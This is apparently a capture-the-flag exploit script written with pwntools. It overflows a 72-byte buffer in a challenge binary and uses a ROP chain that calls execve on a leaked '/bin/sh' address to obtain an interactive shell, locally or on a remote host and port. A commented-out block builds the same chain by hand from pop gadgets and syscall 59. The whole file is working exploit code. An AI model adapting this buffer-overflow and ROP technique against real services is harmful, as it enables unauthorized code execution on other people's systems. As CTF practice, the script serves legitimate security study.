#!/usr/bin/env python3
from pwn import *
import sys

FILENAME = "./src/chal"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
exe = context.binary = ELF(FILENAME)

if len(sys.argv) == 1:
    r = process(FILENAME)
    if args.GDB:
        gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)

r.recvuntil(b"/bin/sh address: ")
binsh = int(r.recvuntil(b"\n", drop=True), 16)

"""
rop = ROP(exe)
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
# pop_rsi = rop.find_gadget(["pop rsi", "ret"]).address
pop_rsi = 0x0000000000403d6f # : pop rsi ; pop rbp ; ret
# pop_rdx = rop.find_gadget(["pop rdx", "ret"]).address
pop_rdx = 0x0000000000466143 # : pop rdx ; leave ; ret
pop_rax = rop.find_gadget(["pop rax", "ret"]).address
syscall = rop.find_gadget(["syscall"]).address

log.info("/bin/sh: " + hex(binsh))
log.info("pop rdi: " + hex(pop_rdi))
log.info("pop rsi: " + hex(pop_rsi))
log.info("pop rdx: " + hex(pop_rdx))
log.info("pop rax: " + hex(pop_rax))
log.info("syscall: " + hex(syscall))

payload = b"A" * 72
payload += p64(pop_rdi) + p64(binsh)
payload += p64(pop_rsi) + p64(0) + p64(binsh - 0x100) # for pop rbp
payload += p64(pop_rdx) + p64(0) + p64(binsh - 0x100) # for leave
payload += p64(pop_rax) + p64(59)
payload += p64(syscall)
"""

rop = ROP(exe)
rop.call("execve", [binsh, 0, 0])
info(rop.dump())

payload = b"A" * 72 + rop.chain()

r.recvuntil(b"Input your data: ")
r.sendline(payload)

r.interactive()
